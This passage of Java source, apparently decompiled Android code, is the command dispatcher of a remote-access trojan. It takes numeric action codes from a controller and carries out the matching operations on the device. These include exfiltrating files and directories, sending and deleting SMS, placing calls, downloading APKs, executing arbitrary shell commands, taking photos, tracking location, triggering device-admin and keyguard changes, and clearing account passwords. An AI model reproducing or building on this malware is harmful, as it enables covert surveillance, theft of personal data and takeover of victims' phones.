          } else if (action.equals(125)) {
            MyService.context.unregisterReceiver(bluetoothDiscoveryReceiver);
          } else if (action.equals(128)) {
            MyService.context.unregisterReceiver(wallpaperReceiver);
          } else if (action.equals(126)) {
            MyService.context.unregisterReceiver(wifiReceiver);
          } else if (action.equals(130)) {
            ((LocationManager) MyService.context.getSystemService(
                Context.LOCATION_SERVICE)).removeUpdates(locationListener);
          }
        }
      } else if (action instanceof Action) {
        if (((Action) action).ACTION == 11) {
          executeWifiCommand(0, (Integer) ((Action) action).DATA);
        } else if (((Action) action).ACTION == 10) {
          executeWifiCommand(1, (Integer) ((Action) action).DATA);
        } else if (((Action) action).ACTION == 34) {
          registerListenerSensor((Integer) ((Action) action).DATA);
        } else if (((Action) action).ACTION == 37) {
          setUiMode((Integer) ((Action) action).DATA);
        } else if (((Action) action).ACTION == 41) {
          executeVibrateCommand(1, (Long) ((Action) action).DATA, null, false);
        } else if (((Action) action).ACTION == 46) {
          h((String) ((Action) action).DATA);
        } else if (((Action) action).ACTION == 48) {
          FileUtils.sendDirectory((String) ((Action) action).DATA);
        } else if (((Action) action).ACTION == 49) {
          // TODO: getAppProcesses
        } else if (((Action) action).ACTION == 50) {
          String[] strArr = (String[]) ((Action) action).DATA;
          FileUtils.renameFile(strArr[0], strArr[1]);
        } else if (((Action) action).ACTION == 51) {
          FileUtils.sendFile((String) ((Action) action).DATA);
        } else if (((Action) action).ACTION == 52) {
          FileUtils.createFile((String) ((Action) action).DATA);
        } else if (((Action) action).ACTION == 60) {
          executeTextToSpeech((Object[]) ((Action) action).DATA);
        } else if (((Action) action).ACTION == 62) {
          sendSms((String[]) ((Action) action).DATA);
        } else if (((Action) action).ACTION == 68) {
          // TODO: Delete Bowser history
        } else if (((Action) action).ACTION == 70) {
          MyService.context.getContentResolver()
              .delete(Uri.parse("content://sms"), "date=" + ((Action) action).DATA, null);
        } else if (((Action) action).ACTION == 74) {
          downloadApk((String) ((Action) action).DATA);
        } else if (((Action) action).ACTION == 75) {
          Intent r3 = new Intent("android.intent.action.CALL");
          r3.setData(Uri.parse("tel:" + ((Action) action).DATA));
          r3.setFlags(268435456);
          MyService.context.startActivity(r3);
        } else if (((Action) action).ACTION == 77) {
          viewDocument((String) ((Action) action).DATA);
        } else if (((Action) action).ACTION == 78) {
          Object[] objArr = (Object[]) ((Action) action).DATA;
          transmitInfraredPattern((Integer) objArr[0], (int[]) objArr[1]);
        } else if (((Action) action).ACTION == 79) {
          executeCommand((String) ((Action) action).DATA);
        } else if (((Action) action).ACTION == 80) {
          FileUtils.viewFile((String) ((Action) action).DATA);
        } else if (((Action) action).ACTION == 88) {
          if (VERSION.SDK_INT >= 3) {
            intent = MyService.context.getPackageManager()
                .getLaunchIntentForPackage((String) ((Action) action).DATA);
            intent.addFlags(268435456);
            MyService.context.startActivity(intent);
          }
        } else if (((Action) action).ACTION == 89) {
          Intent r3 = new Intent("android.intent.action.DELETE", Uri.parse(
              String.format("package:%stopListenSensorEvent", (String) ((Action) action).DATA)));
          r3.addFlags(268435456);
          MyService.context.startActivity(r3);
        } else if (((Action) action).ACTION == 92) {
          openDeviceAdminActivity((String) ((Action) action).DATA);
        } else if (((Action) action).ACTION == 97) {
          executeDevicePolicyCommand(97, (String) ((Action) action).DATA);
        } else if (((Action) action).ACTION == 104) {
          disableKeyguardFeature((Integer) ((Action) action).DATA);
        } else if (((Action) action).ACTION == 129) {
          Integer[] numArr = (Integer[]) ((Action) action).DATA;
          getLocation(numArr[0], numArr[1].intValue());
        }
      } else if (action instanceof _Account) {
        if (VERSION.SDK_INT >= 5) {
          ((AccountManager) MyService.context.getSystemService(
              Context.ACCOUNT_SERVICE)).clearPassword(
              new android.accounts.Account(((_Account) action).NAME, ((_Account) action).TYPE));
        }
      } else if (action instanceof _AudioManager) {
        a((_AudioManager) action);
      } else if (action instanceof Clipboard) {
        setClipboard((Clipboard) action);
      } else if (action instanceof Download) {
        enqueueDownload((Download) action);
      } else if (action instanceof Notification) {
        notification = (Notification) action;
        executeNotificationCommand(false, false, false, false);
      } else if (action instanceof Transfer.Vibrator) {
        Transfer.Vibrator vibrator = (Transfer.Vibrator) action;
        executeVibrateCommand(2, 0, vibrator.PATTERN, vibrator.REPEAT);
      } else if (action instanceof Transfer.Toast) {
        Transfer.Toast toast = (Transfer.Toast) action;
        showToast(toast.TEXT, toast.DURATION);
      } else if (action instanceof TransferFile) {
        TransferFile transferFile = (TransferFile) action;
        FileUtils.createFile(transferFile.NAME, transferFile.CONTENT);
        SendMasterCommunication.sendAction(133);
      } else if (action instanceof Shortcut) {
        shortcut = (Shortcut) action;
        executeShortcutAction(shortcut, false);
      } else if (action instanceof AlertDialog) {
        showAlertDialog((AlertDialog) action);
      } else if (action instanceof CameraShot) {
        takePicture((CameraShot) action);
      } else if (action instanceof Thumbnail) {
        sendPicture((Thumbnail) action);
      }
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }
}
